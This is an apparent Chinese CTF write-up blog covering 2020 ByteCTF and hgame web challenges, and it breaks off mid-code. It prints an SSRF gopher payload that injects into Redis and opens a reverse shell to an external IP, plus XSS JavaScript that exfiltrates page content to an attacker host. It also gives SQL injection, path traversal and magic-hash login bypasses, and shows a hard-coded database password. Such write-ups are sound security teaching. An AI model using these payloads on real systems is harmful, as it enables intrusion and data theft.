<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> scrapy_redis.spiders <span class="keyword">import</span> RedisSpider</span><br><span class="line"><span class="keyword">from</span> bytectf.items <span class="keyword">import</span> BytectfItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ByteSpider</span>(<span class="params">RedisSpider</span>):</span></span><br><span class="line">    name = <span class="string">&#x27;byte&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span>(<span class="params">self, response</span>):</span></span><br><span class="line">        byte_item = BytectfItem()</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_start&#x27;</span>] = response.request.url<span class="comment">#ä¸»é®ï¼åå§url</span></span><br><span class="line">        url_list = []</span><br><span class="line">        test = response.xpath(<span class="string">&#x27;//a/@href&#x27;</span>).getall()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> test:</span><br><span class="line">            <span class="keyword">if</span> i[<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">                url = response.request.url + i</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                url = i</span><br><span class="line">            <span class="keyword">if</span> re.search(<span class="string">r&#x27;://&#x27;</span>,url):</span><br><span class="line">                r = scrapy.Request(url,callback=self.parse2,dont_filter=<span class="literal">True</span>)</span><br><span class="line">                r.meta[<span class="string">&#x27;item&#x27;</span>] = byte_item</span><br><span class="line">                <span class="keyword">yield</span> r</span><br><span class="line">                url_list.append(url)</span><br><span class="line">                <span class="keyword">if</span>(<span class="built_in">len</span>(url_list)&gt;<span class="number">3</span>):</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        byte_item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        byte_item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> byte_item</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse2</span>(<span class="params">self,response</span>):</span></span><br><span class="line">        item = response.meta[<span class="string">&#x27;item&#x27;</span>]</span><br><span class="line">        item[<span class="string">&#x27;byte_url&#x27;</span>] = response.request.url</span><br><span class="line">        item[<span class="string">&#x27;byte_text&#x27;</span>] = base64.b64encode((response.text).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">yield</span> item</span><br></pre></td></tr></table></figure>

<p>bytectf/items.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfItem</span>(<span class="params">scrapy.Item</span>):</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    byte_start = scrapy.Field()<span class="comment">#</span></span><br><span class="line">    byte_text = scrapy.Field()<span class="comment">#text</span></span><br></pre></td></tr></table></figure>

<p>bytectf/pipelines.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BytectfPipeline</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>:</span></span><br><span class="line">        MONGODB_HOST = <span class="string">&#x27;172.20.0.8&#x27;</span></span><br><span class="line">        MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">        MONGODB_DBNAME = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_TABLE = <span class="string">&#x27;result&#x27;</span></span><br><span class="line">        MONGODB_USER = <span class="string">&#x27;N0rth3&#x27;</span></span><br><span class="line">        MONGODB_PASSWD = <span class="string">&#x27;E7B70D0456DAD39E22735E0AC64A69AD&#x27;</span></span><br><span class="line">        mongo_client = pymongo.MongoClient(<span class="string">&quot;%s:%d&quot;</span> % (MONGODB_HOST, MONGODB_PORT))</span><br><span class="line">        mongo_client[MONGODB_DBNAME].authenticate(MONGODB_USER, MONGODB_PASSWD, MONGODB_DBNAME)</span><br><span class="line">        mongo_db = mongo_client[MONGODB_DBNAME]</span><br><span class="line">        self.table = mongo_db[MONGODB_TABLE]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        quote_info = <span class="built_in">dict</span>(item)</span><br><span class="line">        <span class="built_in">print</span>(quote_info)</span><br><span class="line">        self.table.insert(quote_info)</span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>

<p>测试<code>&lt;a href=&quot;gopher://.....&quot;&gt;</code>发现并不能解析gopher协议</p>
<p>继续测试发现接口<code>/result?url=https://www.4399.com</code>，也存在ssrf漏洞且至此gopher协议</p>
<p>传入以下payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3a//172.20.0.7%3a6379/_%250D%250Azadd%2520byte%253Arequests%25201%2520%2522cos%255Cnsystem%255Cn%2528S%2527python%2520-c%2520%255Cx27import%2520socket%252Csubprocess%252Cos%253Bs%253Dsocket.socket%2528socket.AF_INET%252Csocket.SOCK_STREAM%2529%253Bs.connect%2528%2528%255Cx2239.108.164.219%255Cx22%252C60003%2529%2529%253Bos.dup2%2528s.fileno%2528%2529%252C0%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C1%2529%253B%2520os.dup2%2528s.fileno%2528%2529%252C2%2529%253Bp%253Dsubprocess.call%2528%255B%255Cx22/bin/sh%255Cx22%252C%255Cx22-i%255Cx22%255D%2529%253B%255Cx27%2527%255CntR.%2522%250D%250Aquit%250D%250A</span><br></pre></td></tr></table></figure>

<p>成功弹回shell</p>
<h3 id="douyin-vedio"><a href="#douyin-vedio" class="headerlink" title="douyin_vedio"></a>douyin_vedio</h3><p>题目描述</p>
<blockquote>
<p>Do you like douyin video?<br>Submit your payload at <a target="_blank" rel="noopener" href="http://c.bytectf.live:30002/">http://c.bytectf.live:30002/</a></p>
<p>( Server URLs which only admin can access:<br><a target="_blank" rel="noopener" href="http://a.bytectf.live:30001/">http://a.bytectf.live:30001/</a><br><a target="_blank" rel="noopener" href="http://b.bytectf.live:30001/">http://b.bytectf.live:30001/</a> )</p>
</blockquote>
<p>题目中只能将<a target="_blank" rel="noopener" href="http://a.bytectf.live:30001/">http://a.bytectf.live:30001/</a> 开头的url发给管理员，而c.bytectf.live中存在未过滤的xss点</p>
<p>思路就很清晰了，想办法跳转到c.bytectf.live再说，我们查看源代码发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RewriteRule /favicon.ico$ /favicon.ico [QSA,PT,L]</span><br><span class="line">RewriteRule /$ / [QSA,PT,L]</span><br><span class="line">RewriteRule /search$ /search [QSA,PT,L]</span><br><span class="line">RewriteRule /send$ /send [QSA,PT,L]</span><br><span class="line">RewriteRule /static/(.*)$ /static/$1 [QSA,PT,L]</span><br><span class="line">RewriteRule (.*)$ http://www.douyin.com$1  </span><br></pre></td></tr></table></figure>



<p>最后一个神奇的重写规则，所以我们只要在<a target="_blank" rel="noopener" href="http://www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss/">www.douyin.com下找到一个任意url跳转就可以执行c.bytectf.live的xss</a></p>
<p>通常url跳转常出现在登入登出，还有外站url跳转，顺着这个思路我们可以找到<code>http://www.douyin.com/logout/?next=https%3A%2F%2Fwww.douyin.com/23333</code>可以跳转到部分域名(<a target="_blank" rel="noopener" href="http://www.douyin.com/">www.douyin.com</a> , creator.douyin.com …)</p>
<p>这样就扩大了我们的攻击面，继续按照相同的思路进一步扩大攻击面的url:<code>https://creator.douyin.com/passport/web/logout/?next=https://www.douyin.com</code></p>
<p>测试发现可以跳转到任意<code>douyin.com/bytedance.com/.bytecdn.cn/ixigua.com/bytedance.net/snssdk.com/toutiao.com/huoshan.com/jinritemai.com</code>结尾的域名</p>
<p>接着用谷歌搜索：<code>site:xxxxxxx.com 跳转</code> 发现任意url跳转:<code>https://tsearch-quic.snssdk.com/search/jump?url=http://ccreater.top:60080</code></p>
<p>组合成跳转到c.bytectf.live的url:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://a.bytectf.live:30001/logout?next=https%3a//creator.douyin.com/passport/web/logout/%3fnext%3dhttps://tsearch-quic.snssdk.com/search/jump?url=http://c.bytectf.live:30002/?action=post%25252526id=b44cb32f302e2d4249dea06a2ffa0da1</span><br></pre></td></tr></table></figure>

<p>因为安全策略的设置问题(<code>frame-ancestors http://*.bytectf.live:*/</code>覆盖了<code>[&#39;X-Frame-Options&#39;] = &#39;sameorigin&#39;</code>)，导致我们可以直接作为iframe导入，读取内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resp.headers[&#x27;X-Frame-Options&#x27;] = &#x27;sameorigin&#x27;</span><br><span class="line">   resp.headers[&#x27;Content-Security-Policy&#x27;] = &quot;default-src http://*.bytectf.live:*/ &#x27;unsafe-inline&#x27;; frame-src *; frame-ancestors http://*.bytectf.live:*/&quot;</span><br><span class="line">   resp.headers[&#x27;X-Content-Type-Options&#x27;] = &#x27;nosniff&#x27;</span><br><span class="line">   resp.headers[&#x27;Referrer-Policy&#x27;] = &#x27;same-origin&#x27;</span><br></pre></td></tr></table></figure>

<p>所以xss的代码是：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.domain=<span class="string">&quot;bytectf.live&quot;</span>; </span><br><span class="line">flagPage=<span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>); flagPage.src=<span class="string">&quot;http://a.bytectf.live:30001/?keyword=B&quot;</span>; <span class="built_in">document</span>.body.append(flagPage); <span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>&#123; <span class="built_in">document</span>.location=<span class="string">&quot;http://ccreater.top:60001/&quot;</span>+btoa(<span class="built_in">document</span>.body.getElementsByTagName(<span class="string">&quot;iframe&quot;</span>)[<span class="number">0</span>].contentWindow.document.body.innerHTML) &#125;,<span class="number">500</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是不知道为啥iframe.src=<code>http://a.bytectf.live:30001/</code>可以获取到内容，而<code>http://a.bytectf.live:30001/send</code>却不可以。。。</p>
<p>监听端口成功拿到flag</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/2020ByteCTF/" data-id="cku8j3ffs0006dan73p82brd1" data-title="2020ByteCTF" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-2020hgame" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/2020hgame/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.668Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/2020hgame/">2020hgame</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2020hgame"><a href="#2020hgame" class="headerlink" title="2020hgame"></a>2020hgame</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Cosmos-的博客"><a href="#Cosmos-的博客" class="headerlink" title="Cosmos 的博客"></a>Cosmos 的博客</h3><blockquote>
<p>不过有大茄子告诉我的<strong>版本管理工具</strong>以及 GitHub，我改起来也挺方便的。 </p>
</blockquote>
<p>根据提示下载.git</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git remote -v</span><br><span class="line"><span class="comment">#查看git</span></span><br></pre></td></tr></table></figure>

<p>查看提交历史拿到flag</p>
<h3 id="街头霸王"><a href="#街头霸王" class="headerlink" title="街头霸王"></a>街头霸王</h3><p>考察对http的了解</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: kyaru.hgame.n3ko.co</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Cosmos Brower</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">referer: https://vidar.club/ </span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">If-Unmodified-Since: Fri, 02 Jan 2077 00:00:00 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="code-world"><a href="#code-world" class="headerlink" title="code world"></a>code world</h3><p>burp拦截</p>
<p>修改GET为post</p>
<h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>拦截ajax请求,修改分数</p>
<h3 id="Cosmos的博客后台"><a href="#Cosmos的博客后台" class="headerlink" title="Cosmos的博客后台"></a>Cosmos的博客后台</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Only for debug</span></span><br><span class="line"><span class="keyword">if</span> (DEBUG_MODE)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$debug</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;debug&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/^[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*$/&quot;</span>, <span class="variable">$debug</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;args error!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;var_dump($<span class="subst">$debug</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: admin.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$admin_password</span> == md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="variable">$admin_username</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            header(<span class="string">&quot;Location: admin.php&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;ç¨æ·åæå¯ç éè¯¯&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>adminpassword: 0e114902927253523756713132279690 </p>
<p>密码使用==来进行md5校验,找个0e开头的密码即可绕过(QNKCDZO)</p>
<p>adminusername: Cosmos! </p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: admin.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$filter</span> = <span class="string">&quot;/config|etc|flag/i&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="variable">$filter</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker get out!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$action</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) || <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ?action=login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>admin.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insert_img</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;img_url&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$img_url</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;img_url&#x27;</span>];</span><br><span class="line">        <span class="variable">$url_array</span> = parse_url(<span class="variable">$img_url</span>);</span><br><span class="line">        <span class="keyword">if</span> (@<span class="variable">$url_array</span>[<span class="string">&#x27;host&#x27;</span>] !== <span class="string">&quot;localhost&quot;</span> &amp;&amp; <span class="variable">$url_array</span>[<span class="string">&#x27;host&#x27;</span>] !== <span class="string">&quot;timgsa.baidu.com&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">        <span class="variable">$c</span> = curl_init();</span><br><span class="line">        curl_setopt(<span class="variable">$c</span>, CURLOPT_URL, <span class="variable">$img_url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$c</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$res</span> = curl_exec(<span class="variable">$c</span>);</span><br><span class="line">        curl_close(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$avatar</span> = base64_encode(<span class="variable">$res</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(filter_var(<span class="variable">$img_url</span>, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$avatar</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> base64_encode(file_get_contents(<span class="string">&quot;static/logo.png&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> insert_img() ? insert_img() : base64_encode(file_get_contents(<span class="string">&quot;static/error.jpg&quot;</span>)); <span class="meta">?&gt;</span><span class="string">&#x27;&gt;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<p>file%3A%2F%2Flocalhost%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag</p>
<p>hgame{pHp_1s_Th3_B3sT_L4nGu4gE!@!}</p>
<h3 id="Cosmos的留言板-1"><a href="#Cosmos的留言板-1" class="headerlink" title="Cosmos的留言板-1"></a>Cosmos的留言板-1</h3><p>单引号闭合</p>
<p>过滤:select</p>
<p>黑名单:空格</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/union/**/select/**/group_concat(schema_name)/**/FROM/**/information_schema.schemata#</span><br><span class="line">information_schema,easysql</span><br><span class="line">0&#x27;/**/union/**/select/**/GROUP_CONCAT(table_name)/**/FROM/**/information_schema.tables/**/WHERE/**/TABLE_SCHEMA=database();#</span><br><span class="line">f1aggggggggggggg,messages#</span><br><span class="line">GROUP_CONCAT(column_name)/**/FROM/**/information_schema.columns/**/WHERE/**/table_name/**/=/**/&#x27;f1aggggggggggggg&#x27;</span><br><span class="line">fl4444444g</span><br><span class="line"></span><br><span class="line">hgame&#123;w0w_sql_InjeCti0n_Is_S0_IntereSting!!&#125;</span><br></pre></td></tr></table></figure>



<h3 id="Cosmos的新语言"><a href="#Cosmos的新语言" class="headerlink" title="Cosmos的新语言"></a>Cosmos的新语言</h3><p>php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// function encrypt($str)&#123;</span></span><br><span class="line"><span class="comment">//     $result = &#x27;&#x27;;</span></span><br><span class="line"><span class="comment">//     for($i = 0; $i &lt; strlen($str); $i++)&#123;</span></span><br><span class="line"><span class="comment">//         $result .= chr(ord($str[$i]) + 1);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     return $result;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$result</span> .= chr(ord(<span class="variable">$str</span>[<span 